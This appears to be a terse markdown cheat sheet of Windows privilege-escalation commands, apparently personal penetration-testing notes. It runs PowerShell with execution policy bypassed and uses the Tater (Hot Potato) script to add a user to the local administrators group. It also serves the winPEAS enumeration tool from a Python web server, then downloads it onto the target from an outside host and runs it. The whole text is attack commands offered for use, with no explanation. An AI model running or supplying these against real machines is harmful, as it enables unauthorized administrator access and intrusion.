### Hot Potato
cmd:
- `powershell.exe -nop -ep bypass`
<!-- -->

Powershell
- `Import-Module  C:\Users\User\Desktop\Tools\Tater\Tater.ps1`
- `Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"`

### Winpeas.exe
Local:
- `python -m SimpleHTTPServer 80`

<!-- -->
Remote: 
- `powershell.exe -command IWR -Uri $IP/winpeas.exe -OutFile winpeas.exe"`
- `winpeas.exe`
 <!-- -->